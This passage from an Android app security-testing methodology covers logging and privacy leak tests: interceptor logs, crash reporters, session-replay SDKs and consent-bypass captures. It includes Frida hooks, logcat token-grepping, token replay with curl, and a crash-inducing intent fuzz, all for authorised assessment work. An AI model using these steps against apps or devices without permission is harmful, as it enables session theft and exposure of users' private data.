  It is usually behind a `BuildConfig.DEBUG` check that a flavour, a `debuggable` release variant, or a
  library default overrides.
- **How:**
```bash
grep -rnE 'HttpLoggingInterceptor|Level\.(BODY|HEADERS)|setLevel\(|Stetho|Chucker|ChuckerInterceptor|FlipperOkhttpInterceptor|addNetworkInterceptor|addInterceptor' out/sources/
# who is actually installed at runtime?
frida -U -f $PKG -l interceptors.js --no-pause
```
```javascript
Java.perform(function () {
  var B = Java.use('okhttp3.OkHttpClient$Builder');
  ['addInterceptor','addNetworkInterceptor'].forEach(function (m) {
    B[m].implementation = function (i) {
      console.log('[interceptor] ' + i.$className); return this[m](i); }; });
  try {
    var H = Java.use('okhttp3.logging.HttpLoggingInterceptor');
    H.setLevel.implementation = function (l) {
      console.log('[HttpLoggingInterceptor] level=' + l.toString()); return this.setLevel(l); };
  } catch (e) {}
});
```
```bash
adb logcat -c && <exercise login and one authenticated call> && adb logcat -d \
  | grep -aoE 'https?://[^ ]*(authToken|accessCode|token|sig|key|session)=[^& ]*' | head
adb logcat -d | grep -iE 'authorization: bearer|set-cookie|"access_token"'
```
- **Proof:** A logcat line containing a live `Authorization: Bearer …` or a full response body with PII,
  captured after a clean `logcat -c`, plus the interceptor's class name from the hook. Then replay the token
  with `curl` and show the account data returned.
- **Escalation:** -> D13 session theft; -> D15 if the dumped bodies reveal endpoints and fields the UI never
  calls (that is a shadow-API map handed to you for free).
- **Ruled out when:** The runtime hook shows either no logging interceptor installed in the release build,
  or one pinned at `Level.NONE`/`Level.BASIC`, and a full authenticated pass produces no `Authorization`,
  `Set-Cookie` or body content in any buffer.

### D20-011 · Cross-platform framework verbose logging carrying bridge payloads

| | |
|---|---|
| **Severity ceiling** | Medium (High when the logged argument is a token or PAN) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 / AM-11 |
| **Applies to** | Capacitor, Cordova, Ionic; the React Native and Flutter equivalents are `console.log` / `debugPrint` left in |
| **Maps to** | Capacitor `MessageHandler.java` — `Logger.verbose(Logger.tags("Plugin"), "To native (Cordova plugin): callbackId: … service: … action: … actionArgs: …")` and the Capacitor-plugin equivalent; Capacitor `CapConfig.java` (`loggingBehavior`: `none` / `debug` / `production`; `android.loggingEnabled`); MASTG-TOOL-0112 |

- **Test:** Capacitor logs every plugin call including `actionArgs`, and Cordova-compat calls the same way.
  Plugin arguments routinely carry tokens, file paths, and PII. If verbose logging survives into release,
  the entire bridge traffic lands in logcat.
- **How:**
```bash
python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('loggingBehavior'))"
grep -rn 'loggingEnabled\|loggingBehavior' out/assets/ out/res/xml/ 2>/dev/null
adb logcat -c
# exercise login + one data-heavy flow
adb logcat -d | grep -aiE 'To native \(|Plugin|Capacitor|Cordova|ReactNative|flutter' | head -80
adb logcat -d | grep -aiE 'token|bearer|password|authorization|"pan"|otp|ssn|zq4h7m2kx9'
```
- **Proof:** A logcat line from a **release** build containing a real credential or PII value, with the
  producing bridge method named in the same line.
- **Escalation:** The same log tells you the bridge method inventory for free -> D10.
- **Ruled out when:** `loggingBehavior` is `none` (or `production` with no verbose output observed), and a
  driven pass produces no `To native (` lines in a release build.

### D20-012 · ORM query logging enabled in production

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 / AM-11 |
| **Applies to** | Sugar ORM (manifest-driven) and, by the same mechanism, Room / Realm / greenDAO / ObjectBox with a debug-logging switch |
| **Maps to** | mindedsecurity rule `MSTG-PLATFORM-8_2` — *"The application logs debug information on all the Sugar ORM queries, potentially disclosing critical information"*; the rule inspects `AndroidManifest.xml`; CWE-532 |

- **Test:** A rarely-checked variant: the app's own logging hygiene can be immaculate while the ORM dumps
  every statement, with row values inline, to logcat.
- **How:**
```bash
grep -nE 'QUERY_LOG|DATABASE_QUERY_LOG|LOG_QUERY|sugar' out/AndroidManifest.xml
grep -rniE 'setLogLevel|enableLogging|debugMode|loggingEnabled|setQueryCallback' out/sources/ -B4 \
  | grep -inE 'room|realm|sugar|greendao|objectbox|sqldelight'
adb logcat -c && <drive a data flow> && adb logcat -d | grep -aiE 'SELECT |INSERT INTO|UPDATE .* SET'
```
- **Proof:** Logcat lines containing SQL with real values — e.g. `INSERT INTO users … 'zq4h7m2kx9@example.invalid','<token>'`.
- **Escalation:** The statements also hand you the local schema for D11 without opening a database.
- **Ruled out when:** No logging switch is enabled in the release manifest or code, and a driven data flow
  produces no statement text in any buffer.

### D20-013 · `StrictMode` violations logged in a production build

| | |
|---|---|
| **Severity ceiling** | Low |
| **VRT** | `sensitive_data_exposure.visible_detailed_error_page.full_path_disclosure` (P5) is the nearest node; usually informational |
| **Attacker** | AM-11 |
| **Applies to** | all; MASTG is explicit that "the target of this test is the production build of the app" |
| **Maps to** | MASTG-TEST-0263 (Logging of StrictMode Violations), MASTG-TEST-0264 (Runtime Use of StrictMode APIs), MASTG-TEST-0265 (References to StrictMode APIs), MASTG-KNOW-0009, MASWE-0061, semgrep rule `mastg-android-strictmode`; deprecated predecessor MASTG-TEST-0041 |

- **Test:** `StrictMode` policy-violation logging in release leaks implementation detail — file paths, SQL,
  network call sites — into logcat. On its own this is a resilience/debug-artefact item, not a finding.
- **How:**
```bash
grep -rnE 'StrictMode|setVmPolicy|setThreadPolicy|penaltyLog|penaltyDeath|detectAll|detectLeakedClosableObjects' out/sources/
semgrep -c rules/mastg-android-strictmode.yml out/sources/
adb logcat -d | grep -i 'StrictMode'
```
- **Proof:** `StrictMode policy violation` lines in logcat on the production build naming internal paths or
  queries.
- **Escalation:** Only if a violation line discloses a secret, or a path that enables a targeted read -> D11.
- **Ruled out when:** No `StrictMode` policy is installed outside a `BuildConfig.DEBUG` guard **and** a
  driven pass produces no `StrictMode` lines in the release build.

### D20-014 · Tombstones, DropBox, ANR traces and `adb bugreport` — the off-app log path

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-11 (physical unlocked with ADB), AM-04 (an OEM diagnostics package) |
| **Applies to** | all |
| **Maps to** | MASTG-TECH-0009; hackwithsingh sec-14-25 #12 "crash dump residue", #26 "tombstone crash file", #27 "dropbox (system) crash entries"; CWE-532 |

- **Test:** Logcat is not the only system-held copy. Native crashes write tombstones, the framework writes
  DropBox entries, ANRs write traces, and `adb bugreport` bundles all of them into one zip a support process
  routinely asks users to send. Secrets that were in memory at crash time land there.
- **How:**
```bash
adb shell dumpsys dropbox --print 2>/dev/null | head -200
adb shell ls -la /data/tombstones/ /data/anr/ 2>/dev/null
adb bugreport /tmp/br.zip
unzip -o /tmp/br.zip -d /tmp/br && grep -rinE 'bearer |eyJ[A-Za-z0-9_-]{10,}|"password"|otp|zq4h7m2kx9' /tmp/br | head -30
echo "bugreport files: $(find /tmp/br -type f | wc -l)"
```
- **Proof:** The secret inside the bug-report archive or a DropBox entry, with the path inside the zip. The
  attacker story is the support flow — "send us a bug report" — not root.
- **Escalation:** -> D16 if the tombstone shows a native crash you can reach with attacker input;
  -> D20-016 if a crash SDK uploads the same artefacts.
- **Ruled out when:** A forced crash on the most sensitive screen produces a tombstone/DropBox entry that
  contains no marker and no secret-regex hit, and the bug-report grep returns zero across a non-zero file
  count.

### D20-015 · Full request URLs with tokens in the query string, written to the log

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.sensitive_token_in_url.user_facing` (P4); the log copy files as `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); a reset token reaching a third party is `sensitive_data_exposure.token_leakage_via_referer.untrusted_third_party` (P4) |
| **Attacker** | AM-04 / AM-08 / AM-11 |
| **Applies to** | all apps with a remote backend |
| **Maps to** | CVE-2014-1664 (GoToMeeting for Android, EDB 39061); CVE-2018-11505 (EDB 44776); OWASP Mobile Top 10 2024 M6 — "URL query parameters: data visible in server logs and browser history"; CWE-532, CWE-598 |

- **Test:** A token in a query string is copied into every log that touches the request: the app's log, the
  CDN's, the proxy's, the analytics host's, and the WebView's history. The mobile-specific twist is that the
  app often logs the URL itself, so the token leaks locally *and* remotely from one mistake.
- **How:**
```bash
grep -rnE 'HttpLoggingInterceptor|Log\.(d|v|i)\(.*(url|URL|request)|Uri\.Builder|appendQueryParameter' out/sources/
adb logcat -d | grep -aoE 'https?://[^ ]*(authToken|accessCode|access_token|token|sig|key|sessionid|otp)=[^& ]*'
# the wire side, over the capture from D20-002
mitmdump -nr run.mitm -s /dev/stdin <<'PY'
import urllib.parse
SUSPECT = ('email','phone','token','ssn','dob','name','address','password','otp','card','account','sig','key')
def request(f):
    q = urllib.parse.parse_qs(urllib.parse.urlparse(f.request.pretty_url).query)
    hits = [k for k in q if any(s in k.lower() for s in SUSPECT)]
    if hits: print(f.request.pretty_host, f.request.path[:90], hits)
PY
```
- **Proof:** A full URL containing a session or reset token, shown both in the log line and in the proxy
  capture. If the same URL is loaded in a WebView, also show the `Referer` sent to any third-party resource
  on that page.
- **Escalation:** -> D13 (a reset token in a URL that reaches a third-party analytics host is an
  account-takeover path); -> D10 for the WebView history and referer copies.
- **Ruled out when:** Every authenticated request carries its credential in a header or POST body, the
  proxy sweep returns zero suspect query keys across the full flow set, and no URL is logged.

### D20-016 · Crash reporter shipping the log buffer, breadcrumbs and custom keys off-device

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with a live token in the payload, `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-08 (the SDK's own backend is now a copy-holder) |
| **Applies to** | all apps embedding Crashlytics / Sentry / Bugsnag / Instabug / Datadog |
| **Maps to** | developer.android.com risk `log-info-disclosure` (MASVS-STORAGE); MASTG-TEST-0318 / MASTG-TEST-0319; MASWE-0073; CWE-359, CWE-532; T1646 Exfiltration Over C2 Channel |

- **Test:** This is the item that converts a P5 logcat observation into a reportable disclosure: the log line
  no longer requires `READ_LOGS` because the app already sent a copy to a third party. Crash reporters attach
  the recent log buffer, breadcrumbs, custom keys, the last N network calls and sometimes the full request
  body. Force a crash while a secret is in scope and read the upload.
- **How:**
```bash
grep -rnE 'Crashlytics|FirebaseCrashlytics|Sentry\.|SentryAndroid|Bugsnag|Instabug|Datadog|setCustomKey|setUserIdentifier|setUser\(|addBreadcrumb|leaveBreadcrumb|recordException|beforeSend|attachStacktrace|attachScreenshot|attachViewHierarchy|enableLogcat' out/sources/
# force a crash on the most sensitive screen, with the proxy up
adb shell am crash $PKG
# or reach a crash through input, e.g. the D04 extras fuzz
adb shell am start -n $PKG/.TargetActivity --es id "$(python3 -c 'print("A"*100000)')"
# read the upload
mitmdump -nr run.mitm -s /dev/stdin <<'PY'
HOSTS = ('crashlytics','sentry','bugsnag','instabug','datadoghq','firebase')
NEED  = (b'zq4h7m2kx9', b'Bearer', b'eyJ', b'password')
def request(f):
    if any(h in f.request.pretty_host for h in HOSTS):
        b = f.request.content or b''
        hit = [n.decode() for n in NEED if n in b]
        print(f.request.pretty_host, len(b), hit)
PY
```
  Crash payloads are usually gzipped or multipart — decompress in Burp, or hook the pre-compression
  boundary as in D20-024.
- **Proof:** The intercepted request to the named third-party host whose body contains the marker, an
  `Authorization` value, or a full PAN — screenshot the decoded body next to the app screen that produced it.
- **Escalation:** -> D18 (which processor received it, and is its own backend misconfigured); -> D13 if the
  value is an authenticator; the regulatory framing is what usually moves the triager's rating, so state the
  disclosure gap explicitly rather than only the technical flow.
- **Ruled out when:** A forced crash on the most sensitive screen produces an upload whose decoded body
  contains no marker, no auth material and no user text — and the SDK is configured with log/breadcrumb
  attachment disabled (`enableLogcat=false`, no `attachStacktrace` of user data, a `beforeSend` scrubber you
  have read). Save the decoded body as the negative.

### D20-017 · Crash reporter capturing a view hierarchy or screenshot of a `FLAG_SECURE` screen

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — **not** `insecure_data_storage.screen_caching_enabled`, because the capture is in-process and `FLAG_SECURE` is irrelevant to it |
| **Attacker** | AM-08 |
| **Applies to** | all; any API level |
| **Maps to** | MASWE-0038, MASWE-0073; MASTG-TEST-0319; no vendor CVE — the mechanism is documented SDK behaviour |

- **Test:** The inversion worth knowing: **`FLAG_SECURE` does not stop an in-process capture.** It excludes
  the window from the system's screenshot, screen-recording and Recents paths — it does not stop the app's
  own process from walking its view tree or drawing its window to a bitmap. Sentry's view-hierarchy and
  screenshot-on-error attachments, Bugsnag's and Instabug's equivalents, and several session-replay SDKs all
  do exactly that. So the card-entry, OTP, KYC or recovery-code screen the app carefully marked secure is
  shipped off-device anyway.
- **How:**
```bash
grep -rnE 'attachScreenshot|attachViewHierarchy|screenshotOnError|captureScreenshot|setCaptureViewHierarchy|Instabug.*setScreenshot|takeScreenshot' out/sources/ out/res/values/*.xml out/AndroidManifest.xml
grep -rnE 'FLAG_SECURE' out/sources/                 # note WHICH activities set it
# crash on a FLAG_SECURE screen with the proxy up, then look for image/JSON attachments
mitmdump -nr run.mitm -s /dev/stdin <<'PY'
def request(f):
    ct = f.request.headers.get('content-type','')
    if 'multipart' in ct or 'image' in ct:
        print(f.request.pretty_host, f.request.path[:80], ct, len(f.request.content or b''))
PY
```
  Carve any PNG out of a binary body with the magic bytes:
```bash
python3 - <<'PY'
d=open('body.bin','rb').read(); m=b'\x89PNG'; t=b'IEND\xaeB`\x82'
i=n=0
while True:
    s=d.find(m,i)
    if s<0: break
    e=d.find(t,s)
    if e<0: break
    open(f'img_{n:03d}.png','wb').write(d[s:e+8]); n+=1; i=e+8
print(n,'PNGs')
PY
```
- **Proof:** The uploaded screenshot or view-hierarchy JSON showing the typed card number / OTP / recovery
  code, next to the `FLAG_SECURE` declaration for that same activity. The pairing is the finding — the app
  believes that screen is protected.
- **Escalation:** If a `beforeSend` / masking hook exists but is incomplete, enumerate exactly which keys or
  view types escape; that list is the remediation line. -> D18.
- **Ruled out when:** No screenshot/view-hierarchy attachment feature is enabled, or a forced crash on the
  secure screen uploads a view hierarchy in which every sensitive node's text is `null` or masked. Attach the
  masked hierarchy as the negative.

### D20-018 · Session-replay / heatmap SDK recording payment, KYC and OTP screens unmasked

| | |
|---|---|
| **Severity ceiling** | High (Critical where the vendor console exposes multiple users' sessions) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null — HackerOne's multi-user PII standard applies once the console holds many users' recordings) |
| **Attacker** | AM-08 |
| **Applies to** | any app embedding UXCam, Smartlook, Microsoft Clarity, FullStory, Quantum Metric, Contentsquare, Glassbox, LogRocket or an in-house replay SDK |
| **Maps to** | MASWE-0073, MASWE-0067; MASTG-TEST-0319; local corpus bridge table (`getUxCamSessionUrl` — a JS-bridge method that hands a third party a replay URL of the user's session); CWE-359 |

- **Test:** Replay SDKs record the view hierarchy or the rendered frames. Masking is **opt-in per view**, so
  the default state of a newly added screen is *recorded*. Test which screens are recorded unmasked: card
  entry, CVV, the KYC document capture, the OTP screen, the recovery-code screen, the chat thread, the
  medical-history form.
- **How:**
```bash
grep -rniE 'uxcam|smartlook|clarity|fullstory|quantummetric|contentsquare|glassbox|logrocket|sessionreplay' out/sources/ out/AndroidManifest.xml | cut -d: -f1 | sort -u
grep -rniE 'occludeSensitiveView|setSensitive|markSensitive|hideSensitive|maskView|maskAllInputs|addPrivateView|privateView|FS\.privacy|setPrivate|redact' out/sources/
# is a replay URL reachable from a JS bridge? (that hands the third party's console link to web content)
grep -rniE 'getUxCamSessionUrl|getSessionUrl|sessionReplayUrl' out/sources/
# then type a test PAN and a test OTP and read the upload
mitmdump -nr run.mitm -q ~ 'uxcam|smartlook|clarity|fullstory|quantummetric|contentsquare'
```
- **Proof:** The vendor dashboard replay — or the captured upload payload — showing the typed card number,
  CVV, OTP or document image. Screenshot the replay with the value visible, next to the app screen.
- **Escalation:** The SDK's dashboard is now a secondary data store holding cardholder and authentication
  data; ask about its access control in the report. A replay URL exposed on a JS bridge is also a D10
  finding. For a payments app, frame it as PCI-relevant -> D23.
- **Ruled out when:** Every sensitive screen is registered with the SDK's occlusion API (show the call sites)
  **and** a typed marker PAN does not appear in the uploaded payload or the dashboard replay. Screenshot the
  masked replay — it is one of the few visually provable negatives in this chapter.

### D20-019 · Per-SDK egress attribution — which class opened the socket

| | |
|---|---|
| **Severity ceiling** | High (the attribution is what makes the payload finding actionable) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0318 (References to SDK APIs Known to Handle Sensitive User Data), MASTG-TEST-0319 (Runtime Use of…), MASTG-TEST-0206 (which explicitly gives no code locations — pair the two); Google Play "Using SDKs safely and securely" (developers must treat SDK collection as their own and verify SDKs "implement logic respecting user consent preferences"); Oversecured SDK-security research on SDKs "collecting undisclosed data"; T1646 |

- **Test:** "The app talks to eleven hosts" is an inventory. "This analytics SDK sent this user's email and
  precise location" is a finding. Attribute every outbound URL to the stack that requested it, then join that
  to the payload contents.
- **How:**
```bash
mitmdump -s dump.py --set block_global=false -w flows.mitm   # SDKs often ignore the app's proxy settings
frida -U -f $PKG -l attrib.js --no-pause
```
```javascript
// attrib.js — attribute every URL to the stack that requested it
Java.perform(function () {
  var L = Java.use('android.util.Log'), E = Java.use('java.lang.Exception');
  function bt() { return L.getStackTraceString(E.$new()); }
  var B = Java.use('okhttp3.Request$Builder');
  B.url.overload('java.lang.String').implementation = function (u) {
    console.log('[URL] ' + u + '\n' + bt()); return this.url(u); };
  var U = Java.use('java.net.URL');
  U.openConnection.overload().implementation = function () {
    console.log('[URLConn] ' + this.toString() + '\n' + bt()); return this.openConnection(); };
  try {
    var CU = Java.use('org.chromium.net.CronetEngine');   // Cronet bypasses OkHttp hooks entirely
    console.log('[note] Cronet present: ' + CU.$className);
  } catch (e) {}
});
```
```bash
# join: host -> owning SDK -> payload fields
awk '/^\[URL\]/{u=$2} /at com\./{if(u){print u" <- "$2; u=""}}' frida.log | sort -u | head -40
```
- **Proof:** A table: `host | owning SDK (from the stack trace) | fields sent | user flow`. A row containing
  an email, precise location, phone number, or a health/finance value going to a third-party host the privacy
  policy does not name is the finding.
- **Escalation:** -> D20-025 (compare against the Data safety declaration); -> D20-020 (run it again with
  consent off); -> D18 (the SDK's own backend).
- **Ruled out when:** Every third-party host in the capture receives only non-identifying telemetry (event
  names, app version, coarse locale), attributed by stack trace, and the payload sweep for the marker set
  returns zero across a full flow pass. Attach the host→SDK→fields table with the zero column.

### D20-020 · The consent-off differential — identical traffic with every toggle off

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null; the only concrete child, `…wifi_ssid_password`, is P4) — escalate via `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 |
| **Applies to** | all apps with a consent banner, a "do not sell/share" toggle, or a privacy-settings screen |
| **Maps to** | Google Play "Using SDKs safely and securely" (SDKs must "implement logic respecting user consent preferences"); MASWE-0073, MASWE-0074; MASVS-PRIVACY-1; the Body-Diff Rule (a byte-identical response is not a bypass — here, a byte-identical **capture** is the control failure) |

- **Test:** The single most convincing privacy test, and it takes two captures. Run one identical flow with
  every consent toggle **on**, and one with every toggle **off**, from a freshly installed app each time.
  Diff the host set and the field set. If the captures are equivalent, the toggle is decorative — that is a
  demonstrable control failure, not a compliance opinion, and it is exactly the framing Intigriti's triage
  standard requires.
- **How:**
```bash
# run A: accept everything.  run B: decline everything.  Same flow, same account shape, fresh install each.
adb shell pm clear $PKG && mitmdump -w consent_on.mitm    # ... drive flow, accept all ...
adb shell pm clear $PKG && mitmdump -w consent_off.mitm   # ... drive flow, decline all ...
for f in consent_on consent_off; do
  mitmdump -nr $f.mitm -s /dev/stdin <<'PY' > $f.hosts
def request(f): print(f.request.pretty_host, f.request.path.split('?')[0])
PY
  echo "$f flows: $(wc -l < $f.hosts)"
done
diff <(sort -u consent_on.hosts) <(sort -u consent_off.hosts)
# field-level: does the same marker still leave?
for f in consent_on consent_off; do
  echo -n "$f marker hits: "; mitmdump -nr $f.mitm --set flow_detail=3 2>/dev/null | grep -c zq4h7m2kx9
done
```
- **Proof:** The `diff` showing an empty or near-empty delta, plus equal marker counts in both runs, plus a
  screenshot of the consent screen with the toggle in the off position. Quantify: *"11 of 11 third-party
  hosts contacted with consent declined; the advertising ID and the account email left the device in both
  runs."*
- **Escalation:** -> D20-021 if collection also precedes the dialog; -> D20-025 for the declaration side;
  -> D18 to name the SDK that ignored the flag.
- **Ruled out when:** The consent-off run contacts a strict subset of hosts, the marker count drops to zero
  for every optional data type, and the remaining hosts are first-party and functionally necessary. Keep the
  `diff` output — a non-empty delta in the right direction is the negative.

### D20-021 · Pre-consent transmission — data leaving before the dialog is dismissed

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 |
| **Applies to** | all apps that show a consent, ToS or privacy dialog on first launch |
| **Maps to** | MASWE-0073; MASVS-PRIVACY-1; hackwithsingh sec-14-18 #15 "logs user location data without proper consent", #25, #30; riya78 §7 |

- **Test:** Pre-consent transmission is the step that converts a hygiene note into a reportable finding — the
  app has not merely collected more than it declared, it has processed before any lawful basis existed.
  Analytics SDKs initialise in `Application.onCreate()`, which runs before the first Activity draws.
- **How:**
```bash
adb shell pm clear $PKG
mitmdump -w firstlaunch.mitm &
adb shell am start -n $PKG/.MainActivity
# DO NOT TOUCH THE DEVICE. wait 30s with the consent dialog still on screen.
sleep 30; kill %1
mitmdump -nr firstlaunch.mitm -s /dev/stdin <<'PY'
def request(f):
    print(f.request.timestamp_start, f.request.pretty_host, f.request.path[:70], len(f.request.content or b''))
PY
# what identifiers went with it?
AID=$(adb shell settings get secure android_id | tr -d '\r')
mitmdump -nr firstlaunch.mitm --set flow_detail=3 2>/dev/null | grep -c "$AID"
```
- **Proof:** A timestamped request to a third-party host sent **before** the consent dialog was dismissed,
  carrying the Android ID / advertising ID / precise location — with a screen recording showing the dialog
  still on screen at that timestamp.
- **Escalation:** -> D20-020 (the toggle is also decorative); -> D03 if a permission was requested and used
  before any user-facing rationale.
- **Ruled out when:** The first-launch capture contains only first-party calls required to render the consent
  screen itself (config, strings, feature flags) and no identifier from the sweep in D20-052 to D20-054.
  Attach the timestamped host list.

### D20-022 · `AppOpsManager.OnOpNotedCallback` — make the app confess its own private-data reads

| | |
|---|---|
| **Severity ceiling** | High (as evidence for an undeclared-collection report) |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | n/a — instrumentation that produces the strongest evidence in this chapter |
| **Applies to** | **Android 11+ (API 30+)**; `<attribution android:tag>` is required for targetSdk 31+ |
| **Maps to** | developer.android.com/guide/topics/data/audit-access — `AppOpsManager.OnOpNotedCallback`, `onNoted(SyncNotedAppOp)`, `onSelfNoted(SyncNotedAppOp)`, `onAsyncNoted(AsyncNotedAppOp)`, `setOnOpNotedCallback(mainExecutor, cb)`, `SyncNotedAppOp.op` / `.attributionTag`, `AsyncNotedAppOp.getMessage()`; MASTG-TEST-0319 |

- **Test:** The platform will tell you which code read the user's private data — including code inside
  bundled SDKs — with attribution tags and stack traces. Inject the callback with Frida and you get an
  authoritative, first-party record of every location, contacts, camera and microphone access, attributed to
  the calling class. This is far stronger evidence than a grep.
- **How:**
```javascript
Java.perform(() => {
  const ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
  const Cb = Java.registerClass({
    name: 'com.pt.OpCb',
    superClass: Java.use('android.app.AppOpsManager$OnOpNotedCallback'),
    methods: {
      onNoted(op) { console.log('[noted] ' + op.getOp() + ' tag=' + op.getAttributionTag() + '\n' +
        Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new())); },
      onSelfNoted(op) { console.log('[self] ' + op.getOp()); },
      onAsyncNoted(op) { console.log('[async] ' + op.getOp() + ' msg=' + op.getMessage()); }
    }
  });
  ctx.getSystemService(Java.use('android.app.AppOpsManager').class)
     .setOnOpNotedCallback(ctx.getMainExecutor(), Cb.$new());
});
```
```bash
# cross-check against the system's own record
adb shell appops get $PKG | grep -iE 'CAMERA|RECORD_AUDIO|FINE_LOCATION|READ_CONTACTS|time='
```
- **Proof:** Stack traces naming a **third-party package** as the caller of a location/contacts/camera read,
  with the op name and attribution tag, correlated to a request body in the proxy.
- **Escalation:** -> D18 SDK accountability; -> D20-025 for the declaration mismatch; -> D03 if the
  permission exists only because an SDK's manifest merged it in.
- **Ruled out when:** Across a full functional pass the callback reports only ops the app's own packages
  perform, each tied to a user-initiated action, with attribution tags that match the feature. Save the op
  log; an empty third-party column is the negative.

### D20-023 · Attribution-tag mismatch — the Privacy Dashboard shows the wrong reason

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `privacy_concerns.unnecessary_data_collection` (null) |
| **Attacker** | n/a — transparency defect |
| **Applies to** | **targetSdk 31+** |
| **Maps to** | developer.android.com/guide/topics/data/audit-access — *"A `null` attribution tag indicates the main part of your app"*; `<attribution android:tag="sharePhotos" android:label="@string/share_photos_attribution_label" />`; MASVS-PRIVACY-1 |

- **Test:** Attribution tags feed the system's access records, which the user sees in the Privacy Dashboard.
  An app that performs every read under the default (null) attribution, or under a tag whose label does not
  describe the actual purpose, presents the user with an inaccurate account of why their data was accessed.
- **How:**
```bash
grep -n '<attribution' out/AndroidManifest.xml
# map tag -> user-visible label
python3 - <<'PY'
import re,sys
m=open('out/AndroidManifest.xml').read()
for t,l in re.findall(r'<attribution[^>]*android:tag="([^"]+)"[^>]*android:label="([^"]+)"',m):
    print(t,'->',l)
PY
```
  Then collect `attributionTag` per op with the D20-022 hook and compare.
- **Proof:** A background location read reported under a tag labelled "Share photos", or under no tag at all
  while the app declares several attributions.
- **Escalation:** Pair with D20-022 into one undeclared/misattributed-collection report.
- **Ruled out when:** Every op the callback reports carries a tag whose declared label matches the feature
  that triggered it, or the app declares no attributions at all and performs all reads from a single
  user-initiated feature (in which case the null tag is accurate).

### D20-024 · Archived or encrypted telemetry batches — hook the pre-compression boundary

| | |
|---|---|
| **Severity ceiling** | Support (rate on the contents) |
| **VRT** | rate on what the decoded payload contains |
| **Attacker** | n/a — instrumentation |
| **Applies to** | all; standard for high-volume analytics SDKs |
| **Maps to** | T1532 Archive Collected Data (ATT&CK: BRATA S1094 "compressed data with the `zlib` library before exfiltration"; Exodus "encrypts data using XOR prior to exfiltration"); T1646 Exfiltration Over C2 Channel; MASTG-TECH-0100 |

- **Test:** When a telemetry batch is gzipped, protobuf-encoded or encrypted before upload, the proxy shows
  you an opaque blob and the privacy review stops there. Do not fight the format — hook the boundary just
  before it.
- **How:**
```javascript
Java.perform(function () {
  var S = Java.use('java.lang.String');
  var G = Java.use('java.util.zip.GZIPOutputStream');
  G.write.overload('[B','int','int').implementation = function (b, o, l) {
    console.log('[pre-gzip] ' + S.$new(b, o, Math.min(l, 2048))); return this.write(b, o, l); };
  var D = Java.use('java.util.zip.DeflaterOutputStream');
  D.write.overload('[B','int','int').implementation = function (b, o, l) {
    console.log('[pre-deflate] ' + S.$new(b, o, Math.min(l, 2048))); return this.write(b, o, l); };
  var C = Java.use('javax.crypto.Cipher');
  C.doFinal.overload('[B').implementation = function (b) {
    console.log('[pre-cipher] ' + S.$new(b).substring(0, 2048)); return this.doFinal(b); };
});
```
```bash
grep -rnE 'GZIPOutputStream|Deflater|ZipOutputStream|GzipSource|Okio|protobuf|Cipher\.getInstance' out/sources/ | head -30
```
- **Proof:** The decompressed or pre-encryption payload printed by the hook, containing PII the app never
  disclosed it collects, matched to the opaque upload in the proxy by size and timestamp.
- **Escalation:** Feeds D20-019 and D20-025; the archiving itself is Low, the contents carry the rating.
- **Ruled out when:** The pre-compression hook fires (prove it) and the decoded batches contain only event
  names, counters and non-identifying context across a full flow pass.

### D20-025 · Undeclared PII on the wire versus the Play Data safety declaration

| | |
|---|---|
| **Severity ceiling** | High (Critical where it is multi-user sensitive PII per the HackerOne standard) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-08 (a third-party recipient) — for a first-party-only flow this is a compliance finding, which most bounty programmes route to a privacy track rather than pay |
| **Applies to** | all apps handling user data |
| **Maps to** | MASTG-TEST-0206 (Undeclared PII in Network Traffic Capture) — the test fails *"if you can find the PII you entered in the app that is not declared in the app's marketplace privacy declarations (e.g. Data Safety section in Google Play) and/or in its privacy policy"*; prerequisites `identify-sensitive-data`, `privacy-policy`, `app-store-privacy-declarations`; MASTG-TECH-0100; MASTG-TOOL-0097 (mitmproxy), MASTG-TOOL-0077 (Burp), MASTG-TOOL-0079 (ZAP), MASTG-TOOL-0081 (Wireshark); MASWE-0073 (Inadequate Data Collection Declarations), MASWE-0074 (Inadequate Tracking Domains Declarations); MASVS-PRIVACY-1, MASVS-PRIVACY-3; OWASP Mobile Top 10 2024 M6; CWE-359 |

- **Test:** The evaluation is a compliance **delta**, not a judgement: capture decrypted traffic while
  entering the marker set from D20-002, then compare what leaves against the Play listing's Data safety
  section and the privacy policy. MASTG is explicit that this test yields no code locations — pair it with
  D20-019 / MASTG-TEST-0318-0319 to name the SDK and call site, which is what makes it actionable.
- **How:**
```bash
mitmdump -w traffic.flows --set connection_strategy=lazy &
# exercise every flow, typing the canaries
mitmdump -nr traffic.flows -s /dev/stdin <<'PY'
